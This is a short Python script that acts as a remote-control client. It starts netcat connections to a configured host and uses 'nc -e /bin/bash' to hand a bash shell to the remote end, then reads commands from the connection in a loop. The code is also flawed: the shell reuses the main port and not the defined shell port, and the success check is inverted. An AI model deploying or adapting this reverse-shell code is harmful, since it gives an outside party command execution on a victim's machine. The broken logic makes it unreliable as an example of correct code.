import subprocess
import sys


REMOTE_IP = '127.0.0.1'
PORT_MAIN = '7890'
PORT_SHELL = '7891'


def main():
    print('Initialising main coms')
    process_main = subprocess.Popen(["nc", REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    print('Initialising remote shell')
    process_shell = subprocess.Popen(["nc", '-e', '/bin/bash', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

    if process_main.poll() is not None and process_shell.poll() is not None:
        print('Initialisation Successful')
    else:
        raise Exception('Error during initialisation - is megatron running?')

    while True:
        command = process_main.stdout.readline()
        begin_file_update(command, process_main)


def begin_file_update(command, process_main):
    print('command = ' + command)


if __name__ == "__main__":
    main()
